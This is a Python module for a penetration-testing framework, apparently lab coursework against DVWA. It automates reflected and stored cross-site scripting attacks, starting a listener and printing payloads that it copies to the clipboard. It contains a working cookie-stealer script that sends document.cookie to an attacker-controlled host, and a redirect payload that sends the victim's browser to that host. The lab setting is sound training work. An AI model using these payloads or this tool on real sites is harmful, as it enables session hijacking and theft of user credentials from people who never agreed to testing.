from base_module import BaseModule
from utils import colored
import subprocess
import webbrowser
import os
import socket

class DVWAXSS(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dvwa_xss"
        self.description = "DVWA Reflected & Stored XSS (Parts 3 & 4)"

        self.options = {
            "RHOST": {"value": "192.168.107.129", "required": True, "description": "Target DVWA IP or URL"},
            "LHOST": {"value": self.get_local_ip(), "required": True, "description": "Your Kali IP for HTTP server"},
            "LPORT": {"value": "8080", "required": True, "description": "HTTP server port to catch redirect/cookies"},
        }

        self.server_process = None

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def show_options(self):
        print(colored(f"\nModule options ({self.name}):", "orange"))

        header = f"{'Name':<15} {'Current Setting':<30} {'Required':<10} {'Description'}"
        print(colored(header, "yellow"))
        print("-" * 80)

        for name, data in self.options.items():
            value = data.get("value", "")
            required = "yes" if data.get("required") else "no"
            desc = data.get("description", "")
            print(f"{name:<15} {colored(value, 'green'):<30} {colored(required, 'red'):<10} {desc}")

    def show_help(self):
        print(colored("\n=== DVWA XSS Module (Parts 3 & 4) ===", "orange"))
        print("This module supports both Reflected and Stored XSS")
        print("Commands:")
        print("  setup              - Start HTTP server + open reflected XSS page")
        print("  generate_reflected - Generate reflected XSS payload")
        print("  generate_stored    - Generate stored XSS cookie-stealer payload")
        print("  set <option> <value> - Set RHOST, LHOST, LPORT")
        print("  show options       - Show current settings")
        print("  help               - Show this help")
        print("  back / exit        - Return to framework (stops server)\n")
        print("For Part 3 (Reflected): use 'generate_reflected'")
        print("For Part 4 (Stored): use 'generate_stored' → post in Guestbook → view page\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: set <option> <value>")
                return
            option = parts[1].upper()
            value = parts[2]

            if option in self.options:
                self.options[option]["value"] = value
                print(colored(f"{option} → {value}", "green"))
            else:
                print(colored(f"Unknown option: {option}", "red"))
            return

        if low == "setup":
            self.start_http_server()
            self.open_reflected_xss_page()
            return

        if low == "generate_reflected":
            self.generate_reflected()
            return

        if low == "generate_stored":
            self.generate_stored()
            return

        if low in ["back", "exit", "quit"]:
            if self.server_process:
                print(colored("[*] Stopping HTTP server...", "yellow"))
                self.server_process.terminate()
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def start_http_server(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        print(colored(f"[*] Starting HTTP server on http://{lhost}:{lport}", "yellow"))

        cmd = f"python3 -m http.server {lport}"
        try:
            self.server_process = subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd + "; echo 'HTTP server running - press Enter to close...'; read"])
            print(colored("[+] HTTP server started in new terminal", "green"))
        except:
            try:
                self.server_process = subprocess.Popen(["xterm", "-e", cmd])
                print(colored("[+] HTTP server started in xterm", "green"))
            except:
                print(colored("[-] Could not open new terminal. Run manually:", "red"))
                print(f"    {cmd}")

    def open_reflected_xss_page(self):
        rhost = self.options["RHOST"]["value"]
        url = f"http://{rhost}/vulnerabilities/xss_r/"
        print(colored(f"[+] Opening DVWA Reflected XSS page: {url}", "yellow"))
        webbrowser.open(url)

    def generate_reflected(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        payload = f'<img src=x onerror="window.location=\'http://{lhost}:{lport}/xss_test\'">'

        print(colored("\n=== Reflected XSS Payload (Part 3) ===", "orange"))
        print("Paste this into the 'What's your name?' field → Submit")
        print(colored("="*80, "yellow"))
        print(payload)
        print(colored("="*80, "yellow"))

        try:
            subprocess.run(["xclip", "-sel", "clip"], input=payload.encode(), check=True)
            print(colored("[+] Payload copied to clipboard!", "green"))
        except:
            print(colored("[+] Copy the payload above manually", "yellow"))

        print(colored(f"\nAfter submit, check HTTP server terminal for incoming GET /xss_test", "yellow"))

    def generate_stored(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        payload = f"<script>new Image().src='http://{lhost}:{lport}/c?'+encodeURIComponent(document.cookie);</script>"

        print(colored("\n=== Stored XSS Payload (Part 4 - Cookie Stealer) ===", "orange"))
        print("Paste this into the **Message** field in DVWA Stored XSS Guestbook → Submit")
        print("Then refresh or revisit the page to trigger")
        print(colored("="*80, "yellow"))
        print(payload)
        print(colored("="*80, "yellow"))

        try:
            subprocess.run(["xclip", "-sel", "clip"], input=payload.encode(), check=True)
            print(colored("[+] Payload copied to clipboard!", "green"))
        except:
            print(colored("[+] Copy the payload above manually", "yellow"))

        print(colored(f"\nAfter posting, refresh Guestbook page → check HTTP server for GET /c?data=...", "yellow"))
        print(colored("Cookies will appear in query string (no redirect)", "yellow"))